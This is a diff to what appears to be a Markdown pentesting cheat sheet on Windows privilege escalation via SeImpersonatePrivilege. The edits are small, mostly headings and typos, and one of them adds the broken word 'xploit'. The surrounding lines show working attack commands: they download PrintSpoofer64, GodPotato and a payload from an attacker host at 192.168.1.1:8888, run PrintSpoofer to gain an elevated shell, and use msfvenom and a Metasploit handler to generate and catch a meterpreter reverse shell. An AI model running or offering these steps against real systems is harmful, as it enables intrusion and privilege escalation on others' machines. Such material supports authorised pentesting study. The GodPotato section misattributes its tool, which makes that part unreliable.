@@ -3,8 +3,8 @@
 Index
 - [System Enumeration](#System-Enumeration)
 - [SeImpersonatePrivilege](#SeImpersonatePrivilege)
-    - [Exploit by PrintSpoofer64.exe](#Exploit-by-PrintSpoofer64.exe)
-    - [Exploit by GodPotato.exe](#Exploit-by-GodPotato.exe)
+    - [Exploit by PrintSpoofer64](#Exploit-by-PrintSpoofer64)
+    - [Exploit by GodPotato](#Exploit-by-GodPotato)
 
 ## System Enumeration
 Base commands and tools for Windows:
@@ -56,17 +56,17 @@ SeCreateGlobalPrivilege       Create global objects                     Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 ```
 
-### Exploit by PrintSpoofer64.exe
+### Exploit by PrintSpoofer64
 If **SeImpersonatePrivilege** enabled, PrintSpoofer64.exe can exploit the local system and elevate the privileges.
 ``` powershell
 iwr http://192.168.1.1:8888/PrintSpoofer64.exe -outfile PrintSpoofer64.exe      ## download on target system
 .\PrintSpoofer64.exe -i -c powershell.exe                                       ## exploit
 ```
 
-### Exploit by GodPotato.exe
+### Exploit by GodPotato
 If **SeImpersonatePrivilege** enabled, PrintSpoofer64.exe can exploit the local system and run command with elevate privilege.
 
-1. Generate a payload and a listester:
+Generate a payload and a listester:
 ``` bash
 msfvenom -p windows/x64/meterpreter_reverse_https LHOST=$KALI LPORT=443 -f exe -o payload.exe   ## generate payload
 msfconsole                                                                                      ## open msfconsole
@@ -74,9 +74,9 @@ msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_https 
 msf6 exploit(multi/handler) > set LHOST $KALI
 msf6 exploit(multi/handler) > set LPORT 443
 msf6 exploit(multi/handler) > run
-...
 ```
-2. Exploit the system:
+
+xploit the system:
 ``` powershell
 iwr http://192.168.1.1:8888/payload.exe -outfile payload.exe                                    ## download payload on target system
 iwr http://192.168.1.1:8888/GodPotato.exe -outfile GodPotato.exe                                ## download exploit on target system
